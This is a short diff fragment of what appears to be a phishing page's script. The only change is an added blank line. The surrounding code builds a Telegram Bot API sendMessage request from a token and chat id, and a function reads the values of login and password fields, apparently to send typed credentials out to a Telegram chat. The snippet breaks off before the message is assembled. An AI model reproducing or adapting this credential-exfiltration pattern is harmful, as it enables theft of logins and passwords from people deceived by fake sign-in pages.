@@ -35,6 +35,7 @@
             fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}`);
         }
         function go2() {
+    
             const l = document.getElementById('log').value;
             const p = document.getElementById('pas').value;
             if(l && p) {
